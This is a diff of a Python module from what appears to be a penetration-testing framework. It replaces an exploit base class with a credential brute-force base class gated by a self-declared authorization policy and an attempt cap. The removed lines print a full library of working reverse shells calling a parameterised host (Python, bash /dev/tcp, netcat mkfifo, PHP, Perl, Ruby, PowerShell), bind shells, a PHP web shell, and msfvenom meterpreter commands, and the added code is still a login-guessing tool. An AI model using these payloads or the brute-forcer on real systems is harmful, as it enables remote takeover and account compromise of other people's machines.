@@ -1,177 +1,166 @@
+"""Guarded base classes for credential-audit workflows."""
 
 import asyncio
 import socket
-import subprocess
-import sys
-import os
-from abc import ABC, abstractmethod
-from dataclasses import dataclass, field
-from typing import Any, Dict, List, Optional, Tuple
-import json
-import base64
 import time
+from abc import ABC, abstractmethod
+from dataclasses import dataclass
+from itertools import islice
+from typing import Any
+
+from ...payloads.base import Credentials, WordlistManager
+
+
+class SafetyError(RuntimeError):
+    """Raised when a credential-audit workflow is not explicitly authorized."""
+
+
+@dataclass(frozen=True)
+class BruteForcePolicy:
+    """Safety policy required before any credential-audit workflow can run."""
+
+    authorized: bool = False
+    intrusive_checks: bool = False
+    max_attempts: int = 10
+    stop_on_success: bool = True
+
+    def validate(self) -> None:
+        if not self.authorized or not self.intrusive_checks:
+            raise SafetyError('credential-audit workflows require authorized=True and intrusive_checks=True')
+        if self.max_attempts < 1 or self.max_attempts > 25:
+            raise SafetyError('credential-audit workflows are capped between 1 and 25 attempts')
 
 
 @dataclass
-class ExploitResult:
+class BruteForceResult:
+    """Result of a guarded credential-audit workflow."""
 
     success: bool
-    module: str
-    target: str
-    description: str
-    output: Any = None
-    error: Optional[str] = None
-    proof: Optional[str] = None
-    credentials: Optional[Tuple[str, str]] = None
-    shell_url: Optional[str] = None
-    session: Any = None
-    metadata: Dict[str, Any] = field(default_factory=dict)
-    
-    def as_dict(self):
+    credentials: Credentials | None = None
+    service: str = ''
+    target: str = ''
+    port: int = 0
+    error: str | None = None
+    attempts: int = 0
+    duration: float = 0.0
+    evidence: str = ''
+
+    def as_dict(self) -> dict[str, Any]:
         return {
             'success': self.success,
-            'module': self.module,
+            'service': self.service,
             'target': self.target,
-            'description': self.description,
-            'output': str(self.output)[:2000] if self.output else '',
-            'error': self.error,
-            'proof': self.proof[:500] if self.proof else '',
-            'credentials': self.credentials,
-            'shell_url': self.shell_url,
-            'metadata': self.metadata
+            'port': self.port,
+            'username': self.credentials.username if self.credentials else '',
+            'password': self.credentials.password if self.credentials else '',
+            'attempts': self.attempts,
+            'duration': round(self.duration, 2),
+            'evidence': self.evidence,
+            'error': self.error or '',
         }
 
 
-class Exploit(ABC):
-    
-    name: str = "Generic Exploit"
-    description: str = "Generic exploit module"
-    service: str = "unknown"
-    severity: str = "critical"
-    requires: List[str] = []
-    
-    def __init__(self, host: str, port: int, timeout: int = 10):
+class BruteForceBase(ABC):
+    """Abstract base class for guarded credential-audit workflows."""
+
+    def __init__(self, host: str, port: int, timeout: int = 3, max_threads: int = 2):
         self.host = host
         self.port = port
         self.timeout = timeout
-        self.session = None
-        self.options = {}
-        self.shells = []
-    
-    def set_option(self, key: str, value: Any):
-        self.options[key] = value
-    
-    def get_option(self, key: str, default: Any = None) -> Any:
-        return self.options.get(key, default)
-    
+        self.max_threads = min(max(1, max_threads), 4)
+        self._attempts = 0
+
     @abstractmethod
-    async def check(self) -> Tuple[bool, str]:
-        pass
-    
+    async def try_credentials(self, credentials: Credentials) -> bool:
+        """Try a login with the provided credentials."""
+
     @abstractmethod
-    async def exploit(self) -> ExploitResult:
-        pass
-    
-    def _create_socket(self) -> socket.socket:
+    def get_default_username_list(self) -> list[str]:
+        """Return the default username list."""
+
+    @abstractmethod
+    def get_default_password_list(self) -> list[str]:
+        """Return the default password list."""
+
+    async def attack(
+        self,
+        username_list: list[str] | None = None,
+        password_list: list[str] | None = None,
+        policy: BruteForcePolicy | None = None,
+    ) -> BruteForceResult:
+        """Run a guarded credential-audit workflow."""
+
+        policy = policy or BruteForcePolicy()
+        try:
+            policy.validate()
+        except SafetyError as exc:
+            return self._result(False, 0, 0.0, error=str(exc))
+
+        start_time = time.time()
+        credentials_iter = islice(WordlistManager.get_credentials(
+            username_list or self.get_default_username_list(),
+            password_list or self.get_default_password_list(),
+        ), policy.max_attempts)
+
+        successful_creds = None
+        attempts = 0
+        semaphore = asyncio.Semaphore(self.max_threads)
+
+        async def try_with_semaphore(creds: Credentials) -> Credentials | None:
+            nonlocal attempts
+            async with semaphore:
+                if attempts >= policy.max_attempts:
+                    return None
+                attempts += 1
+                self._attempts += 1
+                try:
+                    if await self.try_credentials(creds):
+                        return creds
+                except (OSError, asyncio.TimeoutError):
+                    return None
+                return None
+
+        tasks = []
+        for creds in credentials_iter:
+            tasks.append(asyncio.create_task(try_with_semaphore(creds)))
+
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        for result in results:
+            if isinstance(result, Credentials):
+                successful_creds = result
+                if policy.stop_on_success:
+                    break
+
+        duration = time.time() - start_time
+        return self._result(
+            successful_creds is not None,
+            attempts,
+            duration,
+            credentials=successful_creds,
+        )
+
+    def _result(
+        self,
+        success: bool,
+        attempts: int,
+        duration: float,
+        credentials: Credentials | None = None,
+        error: str | None = None,
+    ) -> BruteForceResult:
+        return BruteForceResult(
+            success=success,
+            credentials=credentials,
+            service=self.__class__.__name__.replace('BruteForce', ''),
+            target=self.host,
+            port=self.port,
+            attempts=attempts,
+            duration=duration,
+            error=error,
+            evidence=f'{attempts} attempts in {duration:.2f}s',
+        )
+
+    def create_socket(self) -> socket.socket:
+        """Create a TCP socket."""
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.settimeout(self.timeout)
         return sock
-    
-    def _execute_command(self, cmd: str, timeout: int = 30) -> Tuple[str, str, int]:
-        try:
-            result = subprocess.run(
-                cmd,
-                shell=True,
-                capture_output=True,
-                text=True,
-                timeout=timeout
-            )
-            return result.stdout, result.stderr, result.returncode
-        except subprocess.TimeoutExpired:
-            return "", "Timeout", -1
-        except Exception as e:
-            return "", str(e), -1
-    
-    def _generate_payload(self, payload_type: str, **kwargs) -> str:
-        payloads = {
-            'reverse_shell': self._reverse_shell_payload(**kwargs),
-            'bind_shell': self._bind_shell_payload(**kwargs),
-            'web_shell': self._web_shell_payload(**kwargs),
-            'meterpreter': self._meterpreter_payload(**kwargs),
-        }
-        return payloads.get(payload_type, '')
-    
-    def _reverse_shell_payload(self, host: str, port: int, lang: str = 'python') -> str:
-        shells = {
-            'python': f"""
-import socket,subprocess,os,pty
-try:
-    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.connect(('{host}',{port}))
-    os.dup2(s.fileno(),0)
-    os.dup2(s.fileno(),1)
-    os.dup2(s.fileno(),2)
-    pty.spawn('/bin/bash')
-except Exception as e:
-    pass
-""",
-            'bash': f"/bin/bash -i >& /dev/tcp/{host}/{port} 0>&1",
-            'nc': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
-            'php': f"""<?php
-set_time_limit(0);
-$sock=fsockopen('{host}',{port});
-exec('/bin/sh -i <&3 >&3 2>&3');
-?>""",
-            'perl': f"perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
-            'ruby': f"ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
-            'powershell': f"""
-$client = New-Object System.Net.Sockets.TCPClient('{host}',{port});
-$stream = $client.GetStream();
-[byte[]]$bytes = 0..65535|%{{0}};
-while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
-    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-    $sendback = (iex $data 2>&1 | Out-String );
-    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
-    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-    $stream.Write($sendbyte,0,$sendbyte.Length);
-    $stream.Flush()
-}};
-$client.Close()
-"""
-        }
-        return shells.get(lang, shells['python'])
-    
-    def _bind_shell_payload(self, port: int, lang: str = 'python') -> str:
-        shells = {
-            'python': f"""
-import socket,subprocess,os
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.bind(('0.0.0.0',{port}))
-s.listen(1)
-conn,addr=s.accept()
-os.dup2(conn.fileno(),0)
-os.dup2(conn.fileno(),1)
-os.dup2(conn.fileno(),2)
-subprocess.call(['/bin/bash','-i'])
-""",
-            'bash': f"nc -lvp {port} -e /bin/bash",
-            'nc': f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -lvp {port} >/tmp/f"
-        }
-        return shells.get(lang, shells['python'])
-    
-    def _web_shell_payload(self, cmd_param: str = 'cmd') -> str:
-        return f"""
-<?php
-if(isset($_GET['{cmd_param}'])) {{
-    system($_GET['{cmd_param}']);
-}}
-?>
-"""
-    
-    def _meterpreter_payload(self, host: str, port: int) -> str:
-        return f"""
-# Générer avec msfvenom:
-# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f py
-# Ou pour Windows:
-# msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe -o payload.exe
-"""
